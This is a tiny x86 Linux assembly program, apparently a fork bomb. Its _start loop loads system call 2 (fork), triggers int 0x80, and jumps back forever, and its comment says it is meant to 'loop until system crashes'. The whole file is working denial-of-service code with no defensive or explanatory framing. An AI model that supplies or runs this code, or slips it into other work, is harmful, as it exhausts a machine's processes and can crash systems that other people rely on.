section .text

global _start

_start:             ; <------------------------------+
  xor eax, eax      ; zero out accumulator register  |
  add eax, 2        ; add 2 to accumulator register  |
  int 0x80          ; ping kernel and execute fork() |
  jmp short _start  ; loop until system crashes o----+


